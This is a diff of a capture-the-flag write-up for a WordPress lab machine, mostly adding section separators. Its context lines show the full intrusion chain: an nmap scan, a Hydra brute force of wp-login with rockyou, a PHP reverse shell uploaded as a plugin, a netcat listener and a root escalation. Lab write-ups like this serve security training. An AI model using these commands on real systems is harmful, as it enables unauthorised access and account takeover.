@@ -23,10 +23,13 @@ Open ports found:
     80 (HTTP)
 
     4512 (SSH on a non-standard port)
+---
 
 Service/version detection:
 
 nmap -p 80,4512 -sV -A 10.10.158.121 -oN nmap.txt
+
+---
 
 2. Web Enumeration
 
@@ -39,6 +42,9 @@ Discovered /Hidden, which contains a message:
     C0ldd, you changed Hugo's password, when you can send it to him so he can continue uploading his articles. – Philip
 
 This reveals a potential valid username: C0ldd.
+
+---
+
 3. WordPress Login Brute Force
 
 I first tested common credentials like admin:admin and admin:password — no success.
@@ -50,6 +56,9 @@ Brute-force attack with Hydra:
 hydra -l C0ldd -P /usr/share/wordlists/rockyou.txt 10.10.158.121 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Incorrect" -V
 
 Login successful. Access to the WordPress admin panel is now available at /wp-admin.
+
+---
+
 4. Uploading a Reverse Shell
 
 From the WordPress admin panel, I uploaded a Pentestmonkey PHP reverse shell, disguised as a plugin.
@@ -60,9 +69,12 @@ However, it didn't appear in the usual plugins folder. After some digging, I fou
 
 I started a Netcat listener:
 
-nc -lvnp <PORT>
+nc -lvnp 4444
 
 Triggering the URL launched the reverse shell successfully.
+
+---
+
 5. SSH Access & User Flag
 
 From the initial shell, I tried reading /home/c0ldd/user.txt but lacked permission.
@@ -84,6 +96,9 @@ It was Base64-encoded:
 echo "RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==" | base64 --decode
 
 → Felicidades, primer nivel conseguido!
+
+---
+
 6.  Privilege Escalation
 
 Checked sudo permissions:
@@ -99,6 +114,8 @@ Confirmed root access with:
 whoami
 # root
 
+---
+
 7. Root Flag
 
 Read the root flag:
@@ -110,6 +127,9 @@ It was also Base64-encoded:
 echo "wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=" | base64 --decode
 
 → ¡Felicidades, máquina completada!
+
+ ---
+ 
   Skills Demonstrated
 
    - Full-range port scanning with Nmap
